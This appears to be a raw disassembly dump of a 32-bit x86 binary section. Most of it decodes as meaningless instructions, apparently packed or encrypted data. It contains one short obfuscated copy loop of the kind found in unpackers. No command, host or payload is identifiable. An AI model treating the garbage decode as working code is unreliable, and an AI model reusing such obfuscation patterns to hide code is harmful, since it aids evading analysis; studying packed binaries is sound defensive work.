  403f37:	(bad)  
  403f39:	(bad)  
  403f3a:	repz shl esi,0xf3
  403f3e:	not    ecx
  403f40:	into   
  403f41:	mov    dh,0xdc
  403f43:	lods   eax,DWORD PTR ds:[esi]
  403f44:	out    dx,eax
  403f45:	lock (bad) 
  403f47:	hlt    
  403f48:	aam    0xdf
  403f4a:	dec    cl
  403f4c:	out    dx,eax
  403f4d:	aad    0xf8
  403f4f:	mov    ecx,0xc0dbe6f4
  403f54:	cld    
  403f55:	aad    0xdf
  403f57:	cld    
  403f58:	loopne 0x403f25
  403f5a:	fimul  WORD PTR [ebx]
  403f5c:	or     esi,eax
  403f5e:	mov    edi,0xc5ced5e0
  403f63:	sar    DWORD PTR [edx-0x1b452b14],cl
  403f69:	mov    bh,0xcf
  403f6b:	cmc    
  403f6c:	jmp    0xd63d2340
  403f71:	add    dl,cl
  403f73:	add    al,0xc6
  403f75:	xlat   BYTE PTR ds:[ebx]
  403f76:	ret    0x6fc
  403f79:	loop   0x403f41
  403f7b:	loope  0x403f83
  403f7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f7e:	into   
  403f7f:	mov    edi,0xd7f7f0bc
  403f84:	sar    bl,cl
  403f86:	cli    
  403f87:	int3   
  403f88:	sti    
  403f89:	ror    al,1
  403f8b:	sti    
  403f8c:	iret   
  403f8d:	fdivr  DWORD PTR [eax+eax*8-0x90b2209]
  403f94:	add    eax,0x9000f0b
  403f99:	retf   
  403f9a:	jmp    0xe92d0980
  403f9f:	out    dx,al
  403fa0:	jmp    0xe4d9:0xd5e2d5e3
  403fa7:	fdivr  st,st(5)
  403fa9:	fxch   st(3)
  403fab:	mov    ebp,0xded1e2c8
  403fb0:	ret    0xfbd2
  403fb3:	add    eax,0xff0303fb
  403fb8:	loopne 0x403fb7
  403fba:	fdivr  st,st(6)
  403fbc:	jmp    0xc322ee93
  403fc1:	out    dx,al
  403fc2:	mov    ah,0xf7
  403fc4:	in     al,dx
  403fc5:	mov    bl,0xcd
  403fc7:	stc    
  403fc8:	enter  0xeafb,0xf7
  403fcc:	jecxz  0x403fcb
  403fce:	mov    DWORD PTR [ebp-0xc],eax
  403fd1:	jmp    0x403feb
  403fd6:	mov    eax,DWORD PTR [ebp-0x8]
  403fd9:	xor    eax,0x75108b5
  403fde:	mov    ecx,DWORD PTR [ebp-0xc]
  403fe1:	lea    eax,[ecx+eax*1+0x3272fb]
  403fe8:	mov    DWORD PTR [ebp-0xc],eax
  403feb:	mov    eax,DWORD PTR [ebp-0xc]
  403fee:	xor    ecx,ecx
  403ff0:	sub    eax,0x5424137
  403ff5:	sbb    ecx,0x0
  403ff8:	xor    eax,0x8a29a14b
  403ffd:	xor    ecx,0x0
  404000:	mov    edx,DWORD PTR [ebp+0x10]
  404003:	xor    esi,esi
  404005:	sub    edx,0x5424137
  40400b:	sbb    esi,0x0
  40400e:	xor    edx,0x8a29a14b
  404014:	xor    esi,0x0
  404017:	mov    DWORD PTR [ebp-0x24],eax
  40401a:	mov    DWORD PTR [ebp-0x20],ecx
  40401d:	mov    DWORD PTR [ebp-0x2c],edx
  404020:	mov    DWORD PTR [ebp-0x28],esi
  404023:	mov    eax,DWORD PTR [ebp-0x24]
  404026:	cmp    eax,DWORD PTR [ebp-0x2c]
  404029:	jne    0x40403b
  40402f:	mov    eax,DWORD PTR [ebp-0x20]
  404032:	cmp    eax,DWORD PTR [ebp-0x28]
  404035:	je     0x404071
  40403b:	mov    eax,DWORD PTR [ebp-0x4]
  40403e:	xor    eax,0x75108b5
  404043:	mov    ecx,DWORD PTR [ebp-0xc]
  404046:	lea    eax,[ecx+eax*1+0x3272fb]
  40404d:	mov    ecx,DWORD PTR [ebp-0x8]
  404050:	xor    ecx,0x75108b5
  404056:	add    ecx,0x3272fb
  40405c:	imul   ecx,DWORD PTR [ebp-0xc]
  404060:	mov    edx,DWORD PTR [ebp+0x8]
  404063:	mov    esi,DWORD PTR [ebp+0xc]
  404066:	mov    al,BYTE PTR [esi+eax*1]
  404069:	mov    BYTE PTR [edx+ecx*1],al
  40406c:	jmp    0x403fd6
  404071:	mov    eax,0xf89c85b3
  404076:	jmp    0x404085
  40407b:	jmp    0x404085
  404080:	mov    eax,0xf89c85b0
  404085:	pop    esi
  404086:	leave  
  404087:	ret    0xc
  40408a:	push   ebp
  40408b:	mov    ebp,esp
  40408d:	jmp    0x4063db
  404092:	in     al,0x68
  404094:	sbb    DWORD PTR gs:[ebp+0x34],esi
  404098:	in     al,0x74
  40409a:	sub    al,0x46
  40409c:	jnp    0x4040fa
  40409e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40409f:	mov    al,ds:0x98aa8468
  4040a4:	jnp    0x404121
  4040a6:	stos   BYTE PTR es:[edi],al
  4040a7:	cwde   
  4040a8:	jnp    0x404125
  4040aa:	shr    esi,cl
  4040ac:	loopne 0x4040ac
  4040ae:	add    dh,bl
  4040b0:	shl    ah,cl
  4040b2:	enter  0xddb,0xc6
  4040b6:	hlt    
  4040b7:	ror    esp,cl
  4040b9:	fnstsw WORD PTR [esi-0x170f0c13]
  4040bf:	lods   eax,DWORD PTR ds:[esi]
  4040c0:	in     eax,dx
  4040c1:	(bad)  
  4040c2:	div    BYTE PTR [esi-0x26142846]
  4040c8:	rcr    edi,1
  4040ca:	fdivr  DWORD PTR [ebp-0x2f391b1e]
  4040d0:	aad    0xd1
  4040d2:	fmulp  st(3),st
  4040d4:	ffreep st(5)
  4040d6:	fimul  WORD PTR [edi]
  4040d8:	stc    
  4040d9:	ret    0xacde
  4040dc:	jmp    0x4040d1
  4040de:	in     al,0xc3
  4040e0:	test   ch,0xe0
  4040e3:	in     al,0xce
  4040e5:	repz mul bl
  4040e8:	repz add edi,edx
  4040eb:	pop    es
  4040ec:	out    0xbe,al
  4040ee:	test   eax,0xd5f8f7d0
  4040f4:	enter  0x10b,0xcf
  4040f8:	loopne 0x4040ed
  4040fa:	rol    ch,0xde
  4040fd:	mov    bh,0xfb
  4040ff:	out    dx,eax
  404100:	hlt    
  404101:	clc    
  404102:	cmc    
  404103:	into   
  404104:	in     eax,0xd6
  404106:	std    
  404107:	retf   
  404108:	out    dx,al
  404109:	add    ebx,ebx
  40410b:	mul    ecx
  40410d:	add    eax,0xdacadad8
  404112:	pop    es
  404113:	aam    0xbc
  404115:	std    
  404116:	in     eax,0xd
  404118:	add    bh,cl
  40411a:	repnz in eax,0xf7
  40411d:	mov    ebp,0xc5b3ccc2
  404122:	lock call 0xcb092001
  404128:	dec    ecx
  40412a:	sti    
  40412b:	fsubr  st(6),st
  40412d:	std    
  40412e:	sar    DWORD PTR [ebx+edi*8-0x261d1826],0xdd
  404136:	sti    
  404137:	cli    
  404138:	out    0xaa,eax
  40413a:	in     al,dx
  40413b:	imul   dl
  40413d:	(bad)  
  40413f:	in     al,0xf7
  404141:	lock rcl ch,1
  404144:	(bad)  
  404146:	cld    
  404147:	idiv   BYTE PTR [ebx-0x232f2930]
  40414d:	cmc    
  40414e:	repz loop 0x404155
  404151:	out    0xea,eax
  404153:	fadd   st,st(6)
  404155:	mov    ah,0xe4
  404158:	jecxz  0x404113
  40415a:	out    0xbe,al
  40415c:	shr    al,cl
  40415e:	enter  0xa8f2,0xcf
  404162:	mov    edx,0xb6eed6ec
  404167:	fucomip st,st(2)
  404169:	in     al,dx
  40416a:	repnz mov esi,0x4e5bbe2
  404170:	sar    cl,0xe7
  404173:	loopne 0x404151
  404175:	call   0xc7193b79
  40417a:	mov    eax,0xb5e6aeb3
  40417f:	jmp    0xb5f5:0xb0e8cefb
  404186:	cld    
  404187:	shl    ebp,1
  404189:	(bad)  
  40418a:	sar    BYTE PTR [edi-0x24fa2610],1
  404190:	stc    
  404191:	or     cl,ah
  404193:	cmc    
  404194:	leave  
  404195:	fsubr  st,st(0)
  404197:	adc    ecx,DWORD PTR [eax+ecx*8]
  40419a:	in     al,dx
  40419b:	scas   eax,DWORD PTR es:[edi]
  40419c:	jmp    0xe4d9:0xe7edcef3
  4041a3:	imul   bl
  4041a5:	fmulp  st(1),st
  4041a7:	in     al,dx
  4041a8:	leave  
  4041a9:	add    edi,DWORD PTR [edx-0x270d0804]
  4041af:	icebp  
  4041b0:	add    bl,cl
  4041b2:	loope  0x4041b4
  4041b4:	or     esp,edi
  4041b6:	fiadd  WORD PTR [esi]
  4041b8:	in     eax,0xdc
  4041ba:	jmp    0x4041aa
  4041bc:	fucom  st(7)
  4041be:	sar    dl,0xba
  4041c1:	aad    0xc9
  4041c3:	sar    ecx,cl
  4041c5:	out    dx,eax
  4041c6:	mov    dh,0xbd
  4041c8:	test   ah,0xd8
  4041cb:	(bad)  
  4041cc:	sti    
  4041cd:	(bad)  
  4041ce:	fcmovu st,st(2)
  4041d0:	jecxz  0x4041b3
  4041d2:	xlat   BYTE PTR ds:[ebx]
  4041d3:	or     eax,ecx
  4041d5:	(bad)  
  4041d6:	fimul  DWORD PTR [ecx]
  4041d8:	add    dh,ch
  4041da:	xlat   BYTE PTR ds:[ebx]
  4041db:	in     al,0xe4
  4041dd:	jmp    0xd21826a5
  4041e2:	(bad)  
  4041e3:	int3   
  4041e4:	std    
  4041e5:	(bad)  
  4041e6:	jmp    0xf9fefddc
  4041eb:	loopne 0x4041da
  4041ed:	fdivp  st(5),st
  4041ef:	jmp    0xe2fa:0xe805c6e1
  4041f6:	add    eax,0xf7e60de8
  4041fb:	mov    ebp,0xc7c5c6f2
  404200:	jmp    0xe4ff:0xd0eef2b4
  404207:	cli    
  404208:	jmp    0xd4f1:0xd5fe03fa
  40420f:	mov    dl,0xd1
  404212:	in     eax,0xc0
  404214:	jmp    0xd40a2211
  404219:	loope  0x4041f7
  40421b:	(bad)  
  40421d:	lods   al,BYTE PTR ds:[esi]
  40421e:	out    0xc4,al
  404220:	loopne 0x404206
  404222:	shl    ch,cl
  404224:	out    dx,eax
  404225:	(bad)
  404228:	fdivr  DWORD PTR [ecx+0x1bddff2]
  40422e:	sti    
  40422f:	hlt    
  404230:	cmc    
  404231:	cli    
  404232:	(bad)  
  404234:	or     al,BYTE PTR [edx]
  404236:	fndisi(8087 only) 
  404238:	clc    
  404239:	in     eax,dx
  40423a:	fdiv   QWORD PTR [ecx-0x2c083e39]
  404240:	into   
  404241:	call   0xd93c20fc
  404246:	jmp    0xf1e2:0xe7dab0ee
  40424d:	stc    
  40424e:	cli    
  40424f:	fdivr  st,st(6)
  404251:	in     al,0xf9
  404253:	add    cl,BYTE PTR [edx]
  404255:	fcom   DWORD PTR [ebx]
  404257:	out    0x6,al
  404259:	ror    edi,0xb3
  40425c:	rol    dl,0xfb
  40425f:	out    dx,al
  404260:	repnz hlt 
  404262:	retf   
  404263:	cli    
  404264:	mov    ecx,0xd5f1d5cf
  404269:	loopne 0x404259
  40426b:	sti    
  40426c:	in     eax,0xd1
  40426e:	loopne 0x40426f
  404270:	fdiv   st(4),st
  404272:	aad    0xc0
  404274:	mul    dh
  404276:	jmp    0xeaf3:0xa6eecace
  40427d:	leave  
  40427e:	mov    cl,0xcd
  404280:	loope  0x404275
  404282:	in     eax,dx
  404283:	div    BYTE PTR [edi+esi*4-0x3c450513]
  40428a:	lock int3 
  40428c:	cli    
  40428d:	loop   0x40425f
  40428f:	faddp  st(5),st
  404291:	add    al,BYTE PTR [ecx]
  404293:	sti    
  404294:	inc    DWORD PTR [ecx]
  404296:	or     eax,0xadde0609
  40429b:	loope  0x404269
  40429d:	mul    edx
  40429f:	rcl    bl,1
  4042a1:	mul    esi
  4042a3:	call   0xff361b9a
  4042a8:	out    dx,al
  4042a9:	mov    esp,0xccf7b803
  4042ae:	pop    es
  4042af:	clc    
  4042b0:	jmp    0xc1d209c
  4042b5:	or     eax,0xe700ea13
  4042ba:	into   
  4042bb:	int    0xe7
  4042bd:	call   0xc80f0577
  4042c2:	retf   
  4042c3:	fdivrp st(3),st
  4042c5:	mov    ebp,0xe9ffedfd
  4042ca:	clc    
  4042cb:	loopne 0x4042c5
  4042cd:	mov    esi,0xd000f4d3
  4042d2:	add    DWORD PTR [eiz*8-0x17271df7],eax
  4042d9:	les    edi,FWORD PTR [edi-0x3f122f32]
  4042df:	aad    0xf7
  4042e1:	shl    eax,1
  4042e3:	lods   eax,DWORD PTR ds:[esi]
  4042e4:	mov    ebx,0xe9edbaf9
  4042e9:	rol    DWORD PTR [edx],cl
  4042eb:	mov    esp,0xe3d2e7fa
  4042f0:	fiadd  DWORD PTR [ebx]
  4042f2:	add    edi,edi
  4042f4:	(bad)  
  4042f6:	fsub   st,st(3)
  4042f8:	dec    eax
  4042fa:	lods   al,BYTE PTR ds:[esi]
  4042fb:	(bad)  
  4042fc:	not    edx
  4042fe:	mov    cl,0xd5
  404300:	out    0xb4,eax
  404302:	shl    DWORD PTR [esi-0x112f0b49],1
  404308:	repnz mov esp,0xdbfcfb07
  40430e:	cmc    
  40430f:	rcl    ch,0xc1
  404312:	jmp    0xf5201ffd
  404317:	les    ecx,FWORD PTR [ebx]
  404319:	(bad)  
  40431a:	out    0xf6,eax
  40431c:	mov    bl,0xc5
  40431e:	jmp    0x4042e3
  404320:	aam    0xd1
  404322:	(bad)  
  404323:	fstp   TBYTE PTR [ebx-0x2230290a]
  404329:	(bad)  
  40432b:	neg    dl
  40432d:	(bad)  
  40432f:	ret    0x2c7
  404332:	in     eax,0xf6
  404334:	aad    0xf9
  404336:	loopne 0x4042fc
  404338:	add    al,0xf2
  40433a:	(bad)  
  40433b:	test   eax,0xc2e8ccd2
  404340:	out    dx,al
  404341:	aam    0xc0
  404343:	(bad)  
  404345:	jmp    0x404310
  404347:	(bad)  
  404348:	aad    0xd7
  40434a:	out    dx,eax
  40434b:	loop   0x40431d
  40434d:	fld    st(5)
  40434f:	add    al,al
  404351:	add    bl,dl
  404353:	(bad)  
  404354:	jecxz  0x40432b
  404356:	ret    0xc00
  404359:	fcom   st(3)
  40435b:	(bad)
  40435e:	retf   
  40435f:	aam    0xcf
  404361:	icebp  
  404362:	enter  0xefef,0xcd
  404366:	stc    
  404367:	retf   
  404368:	retf   0xccd9
  40436b:	div    bh
  40436d:	fdivrp st(3),st
  40436f:	cli    
  404370:	add    al,0xf6
  404372:	or     esp,ebx
  404374:	push   es
  404375:	retf   
  404376:	leave  
  404377:	in     al,dx
  404378:	enter  0xc0ef,0xa9
  40437c:	out    dx,al
  40437d:	shr    BYTE PTR [esi-0x124e0f57],0xb0
  404384:	out    dx,eax
  404385:	mov    ecx,0xdad4f7ca
  40438a:	mov    eax,0x4dcc6f3
  40438f:	add    al,0xe0
  404391:	(bad)  
  404392:	retf   0x3ef
  404395:	in     eax,dx
  404396:	add    eax,DWORD PTR [edi]
  404398:	int    0xe1
  40439a:	jmp    0xcc023463
  40439f:	out    dx,eax
  4043a0:	div    DWORD PTR [esi-0x28452925]
  4043a6:	mov    edx,0xfed0f0d7
  4043ab:	(bad)  
  4043ad:	int3   
  4043ae:	(bad)
  4043b1:	jmp    0xe4de:0xdbe3ddc7
  4043b8:	adc    ah,al
  4043ba:	into   
  4043bb:	jmp    0xecd9:0xc8e6c0f6
  4043c2:	(bad)  
  4043c3:	in     eax,0xac
  4043c5:	mov    edx,0xfccffad3
  4043ca:	out    0xfb,eax
  4043cc:	clc    
  4043cd:	sti    
  4043ce:	add    ebp,ebx
  4043d0:	sar    esi,1
  4043d2:	ret    0xebfd
  4043d5:	fcomp  st(7)
  4043d7:	jecxz  0x4043ab
  4043d9:	icebp  
  4043da:	int    0xe4
  4043dc:	mov    al,0xaf
  4043de:	shr    BYTE PTR [ebp+eax*8-0x2848284a],1
  4043e5:	int3   
  4043e6:	mov    edi,0xecbebaf0
  4043eb:	mov    eax,0xe2e7bbb8
  4043f0:	jmp    0xf8cb:0x9d5d702
  4043f7:	stc    
  4043f8:	enter  0xe3dd,0xf2
  4043fc:	out    0xbd,eax
  4043fe:	in     eax,0xc3
  404400:	mov    al,0xc0
  404402:	loopne 0x4043f1
  404404:	retf   
  404405:	jmp    0xbc120ddd
  40440a:	loopne 0x404401
  40440c:	repnz sar bh,0xda
  404410:	rcr    dl,1
  404412:	loop   0x404419
  404414:	pop    es
  404415:	loopne 0x4043e5
  404417:	ror    DWORD PTR [ebx],0xb1
  40441a:	into   
  40441b:	(bad)
  40441f:	sti    
  404420:	cli    
  404421:	ror    ch,0xe8
  404424:	sti    
  404425:	mov    esi,0xf9f1cfb6
  40442a:	shl    edx,0x5
  40442d:	fcomip st,st(3)
  40442f:	mov    esp,0xe505cbfb
  404434:	jecxz  0x404443
  404436:	sti    
  404437:	add    eax,0xe3e3afea
  40443c:	jmp    0xfab6:0xf3adaed0
  404443:	rol    esp,1
  404445:	fnsave [esi-0x272d0a27]
  40444b:	(bad)  
  40444d:	mov    esi,0xf6c2e4cc
  404452:	(bad)  
  404454:	(bad)  
  404456:	or     edi,ecx
  404458:	or     dh,BYTE PTR [ebx-0x36480e3f]
  40445e:	shr    esi,cl
  404460:	in     al,0xd8
  404462:	mov    dl,0xb1
  404464:	sti    
  404465:	leave  
  404466:	mov    ecx,0xf3dec9d0
  40446b:	std    
  40446c:	ror    ah,0xdb
  40446f:	fadd   st(1),st
  404471:	faddp  st(0),st
  404473:	std    
  404474:	add    dh,al
  404476:	adc    ebp,edi
  404478:	push   DWORD PTR [ecx-0x4a211b36]
  40447e:	lods   al,BYTE PTR ds:[esi]
  40447f:	loope  0x40444f
  404481:	rol    dh,1
  404483:	mov    ch,0xac
  404485:	(bad)  
  404486:	fxch   st(3)
  404488:	fcmovbe st,st(6)
  40448a:	ror    ch,cl
  40448c:	mov    DWORD PTR [ebx],0xd0f0ebfd
  404492:	add    DWORD PTR [edi],ecx
  404494:	or     ch,ah
  404496:	repz push cs
  404498:	or     al,0xcb
  40449a:	ror    ecx,1
  40449c:	in     al,0xb5
  40449e:	repz jmp 0xf0f1:0xd2c5eef0
  4044a6:	cmc    
  4044a7:	call   0xed3efd65
  4044ac:	add    BYTE PTR [ecx],al
  4044ae:	add    bh,dh
  4044b0:	fcmovnu st,st(7)
  4044b2:	out    0xe1,eax
  4044b4:	fld    st(5)
  4044b6:	int3   
  4044b7:	(bad)  
  4044b9:	into   
  4044ba:	(bad)  
  4044bb:	int    0xe9
  4044bd:	xlat   BYTE PTR ds:[ebx]
  4044be:	jmp    0xcefa1797
  4044c3:	(bad)  
  4044c4:	lods   al,BYTE PTR ds:[esi]
  4044c5:	lock shr ah,cl
  4044c8:	cmc    
  4044c9:	bnd jmp eax
  4044cc:	mov    esp,0x5feebe6
  4044d1:	mov    bh,0xdc
  4044d4:	sti    
  4044d5:	iret   
  4044d6:	fld    QWORD PTR [eax]
  4044d8:	pop    es
  4044d9:	out    0xd2,eax
  4044db:	jmp    0xd8e2:0xced2aec5
  4044e2:	out    0xc7,eax
  4044e4:	fcmovbe st,st(6)
  4044e6:	iret   
  4044e7:	in     al,dx
  4044e8:	loope  0x4044bf
  4044ea:	loop   0x4044ce
  4044ec:	in     eax,0xd4
  4044ee:	loopne 0x4044ef
  4044f0:	(bad)  
  4044f2:	jecxz  0x4044fb
  4044f4:	aad    0xc5
  4044f6:	loop   0x4044c0
  4044f8:	into   
  4044f9:	mov    bl,0xc7
  4044fb:	(bad)  
  4044fc:	in     al,dx
  4044fd:	in     eax,0xb7
  4044ff:	sti    
  404500:	aad    0xf9
  404502:	call   0xd51823db
  404507:	inc    DWORD PTR [ecx]
  404509:	mov    edi,0xbe01fcc8
  40450e:	fcmovnu st,st(2)
  404510:	sar    ch,1
  404512:	mov    esi,0x40ef4d6
  404517:	repz shl ebp,cl
  40451a:	(bad)  
  40451b:	iret   
  40451c:	retf   
  40451d:	shr    ebp,cl
  40451f:	lods   eax,DWORD PTR ds:[esi]
  404520:	int    0xe6
  404522:	imul   cl
  404524:	aam    0xb7
  404526:	(bad)  
  404527:	(bad)  
  404528:	mov    esi,0xfeeeb9c9
  40452d:	mov    ebx,0xd0c700be
  404532:	aam    0x5
  404534:	pop    es
  404535:	add    ebp,esp
  404537:	retf   
  404538:	add    al,0xac
  40453a:	loop   0x40450b
  40453c:	scas   al,BYTE PTR es:[edi]
  40453d:	int3   
  40453e:	retf   
  40453f:	aam    0xe7
  404541:	fcom   st(7)
  404543:	cli    
  404544:	in     al,dx
  404545:	cld    
  404546:	mov    ebx,0xf9e0f4e3
  40454b:	idiv   BYTE PTR [ebp+0xae3ebda]
  404551:	loope  0x404527
  404553:	iret   
  404554:	jmp    0xd0ed:0xd09f4fb
  40455b:	out    dx,al
  40455c:	repz jecxz 0x404553
  40455f:	shl    esp,0xcc
  404562:	in     eax,dx
  404563:	clc    
  404564:	out    dx,al
  404565:	clc    
  404566:	mov    dh,0xd1
  404568:	loope  0x40454c
  40456a:	into   
  40456b:	shl    ebp,cl
  40456d:	icebp  
  40456e:	add    ecx,ebx
  404570:	push   es
  404571:	or     al,BYTE PTR [edi]
  404573:	jmp    0x40454a
  404575:	add    edi,ebx
  404577:	loop   0x404558
  404579:	in     eax,0xe8
  40457b:	(bad)  
  40457c:	mov    cl,0xcb
  40457e:	fucomi st,st(1)
  404580:	out    dx,al
  404581:	jmp    0xeeb9:0xdafbcccc
  404588:	fdivr  st,st(7)
  40458a:	fsub   st(5),st
  40458c:	pop    es
  40458d:	cld    
  40458e:	mov    edx,0xe2c1f0f1
  404593:	add    al,0xc4
  404595:	dec    BYTE PTR [esi]
  404597:	jmp    0xf5d0:0xcad7a803
  40459e:	mov    ch,0xe5
  4045a0:	sti    
  4045a1:	rcl    edx,cl
  4045a3:	fldcw  WORD PTR [esi+ecx*8-0x33450f01]
  4045aa:	(bad)  
  4045ab:	mov    eax,0xf3bed8d1
  4045b0:	jmp    0xe23a2a93
  4045b5:	add    eax,0xe2cdcdfe
  4045ba:	loope  0x404569
  4045bc:	shl    ebx,1
  4045be:	in     al,dx
  4045bf:	mov    ah,0xb2
  4045c1:	ror    edx,0xe5
  4045c4:	icebp  
  4045c5:	mov    dh,0xfa
  4045c7:	repz ret 0xb600
  4045cb:	into   
  4045cc:	ret    0xfafa
  4045cf:	ret    
  4045d0:	shl    ah,0x3
  4045d3:	xlat   BYTE PTR ds:[ebx]
  4045d4:	push   es
  4045d5:	ret    
  4045d6:	in     eax,0xe4
  4045d8:	iret   
  4045d9:	out    dx,eax
  4045da:	test   eax,0xf2d5b0ea
  4045df:	repz mov bl,0xfb
  4045e2:	mov    eax,0xd3d5ddce
  4045e7:	cli    
  4045e8:	enter  0xcff6,0xfd
  4045ec:	in     eax,0xc5
  4045ee:	in     eax,0xa
  4045f0:	(bad)  
  4045f1:	std    
  4045f2:	xlat   BYTE PTR ds:[ebx]
  4045f3:	std    
  4045f4:	clc    
  4045f5:	(bad)  
  4045f6:	in     eax,dx
  4045f7:	rcl    DWORD PTR [ecx],cl
  4045f9:	leave  
  4045fa:	shl    DWORD PTR [edx-0x372c171d],cl
  404600:	mov    cl,0xd1
  404602:	mov    al,0xd5
  404604:	jmp    0x4045ef
  404606:	shr    al,cl
  404608:	enter  0xc0d7,0xd8
  40460c:	fcom   st(2)
  40460e:	in     eax,0xfb
  404610:	or     al,ah
  404612:	lock fmul st,st(6)
  404615:	jecxz  0x404603
  404617:	add    cl,BYTE PTR [eax]
  404619:	rol    dl,cl
  40461b:	leave  
  40461c:	in     al,0xec
  40461e:	icebp  
  40461f:	rol    edx,0xd9
  404622:	(bad)  [eax-0xd294116]
  404628:	sti    
  404629:	cli    
  40462a:	iret   
  40462b:	rcr    ah,0xf8
  40462e:	sar    bl,1
  404630:	ret    0xf8dc
  404633:	out    dx,al
  404634:	fucomi st,st(3)
  404636:	loopne 0x404606
  404638:	(bad)  
  404639:	lods   al,BYTE PTR ds:[esi]
  40463a:	out    dx,eax
  40463b:	loop   0x40461d
  40463d:	out    dx,eax
  40463e:	mov    bh,0xcd
  404640:	test   al,0xee
  404642:	(bad)  
  404643:	in     al,dx
  404644:	lds    esi,FWORD PTR [esp+ebx*8-0x3e1c0742]
  40464b:	icebp  
  40464c:	(bad)  
  40464d:	cld    
  40464e:	push   es
  40464f:	pop    es
  404650:	(bad)  
  404652:	fadd   DWORD PTR [ebx]
  404654:	aam    0xf5
  404656:	enter  0xd9cf,0xd9
  40465a:	fstp   st(7)
  40465c:	loop   0x404623
  40465e:	retf   0xc6ad
  404661:	jmp    0xfe050d38
  404666:	std    
  404667:	(bad)  
  404669:	out    dx,eax
  40466a:	mov    esi,0xf8f3f2f1
  40466f:	rol    DWORD PTR [ecx+eax*8],0xfc
  404673:	add    eax,0x9c20ed6
  404678:	add    edi,eax
  40467a:	jmp    0xca2b296d
  40467f:	loope  0x404676
  404681:	repz mov edx,0xbce8efd2
  404687:	cmc    
  404688:	leave  
  404689:	in     eax,dx
  40468a:	out    0xf7,eax
  40468c:	in     eax,0xf4
  40468e:	hlt    
  40468f:	(bad)  
  404691:	or     bl,bl
  404693:	loope  0x40469a
  404695:	add    al,bl
  404697:	jmp    0x40467b
  404699:	leave  
  40469a:	(bad)  
  40469c:	lods   al,BYTE PTR ds:[esi]
  40469d:	(bad)  
  40469e:	out    dx,al
  40469f:	mov    bl,0xd2
  4046a1:	xlat   BYTE PTR ds:[ebx]
  4046a2:	into   
  4046a3:	call   0xef3c3171
  4046a8:	(bad)  
  4046aa:	in     eax,dx
  4046ab:	out    0xfd,al
  4046ad:	(bad)  
  4046af:	fsubrp st(1),st
  4046b1:	out    0xea,al
  4046b3:	hlt    
  4046b4:	(bad)  
  4046b5:	loope  0x40468b
  4046b7:	repz fmul st(6),st
  4046ba:	fst    st(2)
  4046bc:	repz out 0xae,al
  4046bf:	mov    bl,0xbb
  4046c1:	(bad)
  4046c4:	fxch   st(1)
  4046c6:	int3   
  4046c7:	fdivr  st,st(0)
  4046c9:	mov    eax,0xe2fbfdf4
  4046ce:	sti    
  4046cf:	ret    
  4046d0:	in     al,0xf7
  4046d2:	jecxz  0x4046b5
  4046d4:	cli    
  4046d5:	fild   DWORD PTR [eiz*8-0x15215103]
  4046dc:	mov    bl,0xe0
  4046de:	bnd jmp 0xe900fbd8
  4046e4:	std    
  4046e5:	stc    
  4046e6:	stc    
  4046e7:	cld    
  4046e8:	clc    
  4046e9:	jecxz  0x4046d8
  4046eb:	hlt    
  4046ec:	clc    
  4046ed:	ffreep st(4)
  4046ef:	lock in eax,0x9
  4046f2:	out    0xf5,al
  4046f4:	add    ebx,edi
  4046f6:	fild   DWORD PTR [ecx]
  4046f8:	add    esi,eax
  4046fa:	mov    eax,0xc4d3e9b0
  4046ff:	call   0xbb3c21eb
  404704:	shr    ebp,1
  404706:	leave  
  404707:	add    edi,esi
  404709:	cmc    
  40470a:	out    dx,eax
  40470b:	lock xacquire inc BYTE PTR [ecx]
  40470f:	rol    BYTE PTR [ecx],1
  404711:	ret    
  404712:	loop   0x404710
  404714:	fsubr  st,st(7)
  404716:	out    dx,eax
  404717:	adc    bl,cl
  404719:	ret    0xf0e7
  40471c:	in     eax,0xe6
  40471e:	(bad)
  404722:	shl    dh,1
  404724:	mov    edi,0xd1edf2db
  404729:	lock rcl al,1
  40472c:	push   es
  40472d:	aam    0xf3
  40472f:	aam    0xd9
  404731:	icebp  
  404732:	rcl    dh,1
  404734:	(bad)  
  404735:	in     eax,dx
  404736:	out    dx,eax
  404737:	out    0xe0,eax
  404739:	retf   
  40473a:	mov    eax,0xfbc2c8c1
  40473f:	out    dx,al
  404740:	enter  0xdaf4,0xf2
  404744:	(bad)  
  404747:	fcmovne st,st(5)
  404749:	(bad)  
  40474a:	loope  0x404704
  40474c:	int    0xd2
  40474e:	add    eax,0xd0fa09db
  404753:	or     bl,dh
  404755:	iret   
  404756:	into   
  404757:	retf   0xd9e1
  40475a:	shl    DWORD PTR [edx-0x3a533253],1
  404760:	in     al,dx
  404761:	scas   eax,DWORD PTR es:[edi]
  404762:	repz out 0xbe,eax
  404765:	cmc    
  404766:	sar    DWORD PTR [esi-0x6180844],cl
  40476c:	in     eax,0xdb
  40476e:	push   es
  40476f:	hlt    
  404770:	fld    QWORD PTR [eax]
  404772:	out    0x4,al
  404774:	or     bl,dh
  404776:	or     dl,bl
  404778:	enter  0xccc3,0xa8
  40477c:	iret   
  40477d:	ret    0xb3d5
  404780:	jmp    0xd6de:0xbaeafbb4
  404787:	mov    edi,0xe2d80301
  40478c:	aad    0x6
  40478e:	cmc    
  40478f:	retf   
  404790:	fcmovbe st,st(1)
  404792:	add    al,0xe2
  404794:	hlt    
  404795:	out    dx,al
  404796:	in     al,dx
  404797:	add    bh,bl
  404799:	icebp  
  40479a:	loop   0x404765
  40479c:	ror    edi,0xcc
  40479f:	aam    0xd6
  4047a1:	in     eax,0xc9
  4047a3:	rcl    ah,cl
  4047a5:	cli    
  4047a6:	call   0xe9323b77
  4047ab:	fidivr DWORD PTR [eax-0x3f3a1e3b]
  4047b1:	idiv   ecx
  4047b3:	out    0xdb,eax
  4047b5:	fisttp DWORD PTR [eax]
  4047b7:	fsub   st,st(1)
  4047b9:	fsubrp st(1),st
  4047bb:	retf   
  4047bc:	(bad)  
  4047bd:	div    esi
  4047bf:	lods   eax,DWORD PTR ds:[esi]
  4047c0:	rcl    eax,cl
  4047c2:	push   DWORD PTR [ebp-0x10460f12]
  4047c8:	int3   
  4047c9:	mov    edi,0xc1f5fdf4
  4047ce:	add    edx,eax
  4047d0:	add    al,0xf7
  4047d2:	fsub   st(7),st
  4047d4:	aad    0xdf
  4047d6:	out    dx,eax
  4047d7:	leave  
  4047d8:	repnz scas al,BYTE PTR es:[edi]
  4047da:	repnz imul esp
  4047dd:	(bad)  
  4047de:	lock jmp 0xba2f36af
  4047e4:	in     eax,0xbb
  4047e6:	mov    edx,0xdaf8bab9
  4047eb:	(bad)  
  4047ed:	loop   0x4047ca
